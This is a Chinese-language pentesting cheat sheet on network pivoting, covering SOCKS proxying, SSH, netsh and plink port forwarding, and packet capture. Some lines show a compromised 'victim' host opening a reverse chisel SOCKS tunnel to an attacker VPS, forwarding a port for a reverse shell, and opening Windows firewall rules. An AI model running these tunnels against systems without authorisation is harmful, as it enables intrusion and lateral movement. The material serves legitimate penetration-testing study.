# 网络内网穿透技术 (Network Pivoting Techniques)

## SOCKS 代理 (SOCKS Proxy)

### SOCKS 兼容性表 (SOCKS Compatibility Table)

| SOCKS 版本 | TCP   | UDP   | IPv4  | IPv6  | 主机名 |
| ---------- | :---: | :---: | :---: | :---: | :---:  |
| SOCKS v4   | ✅    | ❌    | ✅    | ❌    | ❌     |
| SOCKS v4a  | ✅    | ❌    | ✅    | ❌    | ✅     |
| SOCKS v5   | ✅    | ✅    | ✅    | ✅    | ✅     |

### SOCKS 代理用法 (SOCKS Proxy Usage)

#### Proxychains

* [rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng) - 一个预加载器，它通过钩子捕获动态链接程序中的套接字调用，并将其通过一个或多个 SOCKS/HTTP 代理进行重定向。这是已停止维护的 proxychains 项目的延续。
* [haad/proxychains](https://github.com/haad/proxychains) - 一个强制任何给定应用程序建立的任何 TCP 连接通过 TOR 或任何其他 SOCKS4、SOCKS5 或 HTTP(S) 代理的工具。支持的身份验证类型：SOCKS4/5 的 "user/pass"，HTTP 的 "basic"。

编辑**配置文件** `/etc/proxychains.conf` 以添加 SOCKS 代理。

```bash
[ProxyList]
# socks4 localhost 8080
socks5 localhost 8081
```

取消 `proxy_dns` 的注释以同时通过代理进行 DNS 请求。

```ps1
proxychains nmap -sT 10.10.10.10
proxychains curl http://10.10.10.10
```

#### Proxifier

Proxifier 允许不支持通过代理服务器工作的网络应用程序通过 SOCKS 或 HTTPS 代理和链进行操作。

* [proxifier](https://www.proxifier.com/) - 最先进的代理客户端。

打开 Proxifier，转到 **Profile** -> **Proxy Servers** 并 **Add a new proxy entry**，该条目将指向 SOCKS 代理的 IP 地址和端口。

转到 **Profile** -> **Proxification Rules**。在这里你可以添加规则，告诉 Proxifier 何时何地代理特定的应用程序。同一规则中可以添加多个应用程序。

#### Graftcp

* [hmgle/graftcp](https://github.com/hmgle/graftcp) - 一个灵活的工具，用于将给定程序的 TCP 流量重定向到 SOCKS5 或 HTTP 代理。

:warning: 与 proxychains 类似，但具有另一种“代理化 (proxify)”机制，允许 Go 应用程序。

```ps1
# 使用 Chisel 或其他工具创建一个 SOCKS5，并通过 SSH 进行转发
(攻击者) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS
(vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse 
(受害者 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks 

# 运行 graftcp 并指定 SOCKS5
(攻击者) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080
(攻击者) $ graftcp ./nuclei -u http://10.10.10.10
```

graftcp 的简单配置文件：[example-graftcp-local.conf](https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf)

```py
## 监听地址 (默认 ":2233")
listen = :2233
loglevel = 1

## SOCKS5 地址 (默认 "127.0.0.1:1080")
socks5 = 127.0.0.1:1080
# socks5_username = SOCKS5USERNAME
# socks5_password = SOCKS5PASSWORD

## 设置选择代理的模式 (默认 "auto")
select_proxy_mode = auto
```

## 端口转发 (Port Forwarding)

### SSH (原生)

| 内网穿透技术 | 命令 |
| ------------ | ---- |
| 本地端口转发 | `ssh -L [绑定地址]:[端口]:[目标主机]:[目标端口] [用户]@[主机]` |
| 远程端口转发 | `ssh -R [绑定地址]:[端口]:[本地主机]:[本地端口] [用户]@[主机]` |
| SOCKS 代理   | `ssh -N -f -D 监听端口 [用户]@[主机]` |

在已建立的 SSH 会话中，按下 `~C` 可打开交互模式，以添加本地 (-L)、远程 (-R) 或动态 (-D) 端口转发。`-D` 目前无法在连接后添加。只有 `-L` 或 `-R` 能可靠工作。OpenSSH 不支持在现有会话中进行动态转发。

```ps1
~C
-L 1080:127.0.0.1:1080
```

### Netsh (原生)

```powershell
netsh interface portproxy add v4tov4 listenaddress=本地地址 listenport=本地端口 connectaddress=目标地址 connectport=目标端口
netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110
```

```powershell
# 例如，转发端口 4545 用于反弹 shell，以及端口 80 用于 http 服务器
netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545
netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80
```

```powershell
# 在机器上正确打开端口
netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545
```

1. `listenaddress` – 是等待连接的本地 IP 地址。
2. `listenport` – 本地监听的 TCP 端口（连接在此等待）。
3. `connectaddress` – 是传入连接将被重定向到的本地或远程 IP 地址（或 DNS 名称）。
4. `connectport` – 是来自 `listenport` 的连接被转发到的 TCP 端口。

### 自定义工具 (Custom Tools)

* [jpillora/chisel](https://github.com/jpillora/chisel)
* [ginuerzh/gost](https://github.com/ginuerzh/gost)

    ```ps1
    gost -L=tcp://:2222/192.168.1.1:22 [-F=..]
    ```

* [PuTTY/plink](https://putty.org/index.html)

    ```powershell
    plink -R [VPS 上要转发到的端口]:localhost:[本地机器上要转发的端口] [VPS IP]
    plink -l root -pw toor -R 445:127.0.0.1:445 
    ```

## 网络抓包 (Network Capture)

### TCPDump

* [the-tcpdump-group/tcpdump](https://github.com/the-tcpdump-group/tcpdump)

```ps1
# 抓取并将输出保存到 0001.pcap 中
tcpdump -w 0001.pcap -i eth0

# 抓取并以 ASCII 形式显示数据包
tcpdump -A -i eth0

# 在接口 eth0 上抓取所有 TCP 数据包
tcpdump -i eth0 tcp

# 抓取端口 22 上的所有数据
tcpdump -i eth0 port 22
```

### Netsh

* 使用 netsh 命令开始抓包。

    ```ps1
    netsh trace start capture=yes report=disabled tracefile=c:\trace.etl maxsize=16384
    ```

* 停止追踪

    ```ps1
    netsh trace stop
    ```

* 事件追踪 (Event tracing)

    ```ps1
    netsh trace start capture=yes report=disabled persistent=yes tracefile=c:\trace.etl maxsize=16384
    etl2pcapng.exe c:\trace.etl c:\trace.pcapng
    ```

* 使用过滤器

    ```ps1
    netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\trace.etl maxsize=16384
    ```

## 参考资料 (References)

* [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
* [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre ZANNI](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/)
* [GO Simple Tunnel - Documentation](https://gost.run/en/)
* [Ligolo-ng - Documentation](https://docs.ligolo.ng/)
* [Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)
* [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
* [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin - November 10, 2015](https://web.archive.org/web/20151205120607/https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
* [Windows: Capture a network trace with builtin tools (netsh) - Michael Albert - February 22, 2021](https://michlstechblog.info/blog/windows-capture-a-network-trace-with-builtin-tools-netsh/)
